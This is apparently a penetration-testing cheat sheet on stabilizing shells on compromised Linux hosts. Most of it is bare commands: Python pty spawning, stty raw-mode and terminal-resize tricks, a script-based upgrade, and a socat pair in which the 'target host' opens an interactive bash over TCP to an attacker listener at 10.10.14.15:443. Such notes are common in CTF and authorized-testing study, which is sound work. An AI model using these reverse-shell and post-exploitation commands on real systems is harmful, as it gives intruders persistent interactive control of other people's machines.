# Stabilizing Shells

### Interactive Upgrade

#### Python

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
/usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
```

#### Python3

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c '__import__("pty").spawn("/bin/bash")'
```

#### Full Upgrade

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl + z
stty raw -echo; fg
export TERM=xterm
# local terminal
stty -a
# remote terminal 
stty cols=xx rows=xx
```

#### Bash

```bash
SHELL=/bin/bash script -q /dev/null
```

#### SOCAT

**attacker host**

```bash
socat file:`tty`,raw,echo=0 tcp-listen:443
```

**target Host**

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.15:443
```

#### Second Method

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
ctrl+z
```

* in a local terminal

```bash
echo $TERM
stty -a
```

* Set TTY to raw

```bash
stty raw -echo
```

* Foreground the shell

```bash
fg
```

* Reinitialize terminal

```bash
reset
```

* Set shell terminal type

```bash
export SHELL=bash
export TERM=xterm256-color
stty rows 30 columns 108
```
